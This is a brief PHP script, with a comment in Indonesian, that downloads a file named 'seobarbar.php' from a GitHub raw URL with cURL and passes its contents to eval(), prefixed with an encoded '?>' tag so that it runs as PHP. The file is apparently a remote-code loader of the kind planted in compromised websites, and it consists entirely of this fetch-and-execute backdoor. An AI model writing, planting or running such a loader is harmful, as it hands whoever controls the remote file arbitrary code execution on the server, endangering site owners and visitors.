<?php
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, urldecode("https://raw.githubusercontent.com/5Y4H/seo/refs/heads/main/seobarbar.php"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$content = curl_exec($ch);

if(curl_errno($ch)) {
    echo "cURL Error: " . curl_error($ch);
    exit;
}

curl_close($ch);

// Menampilkan error yang mungkin terjadi di dalam script yang dijalankan
error_reporting(E_ALL);
ini_set('display_errors', 1);

eval(urldecode("%3f%3e") . $content);
?>
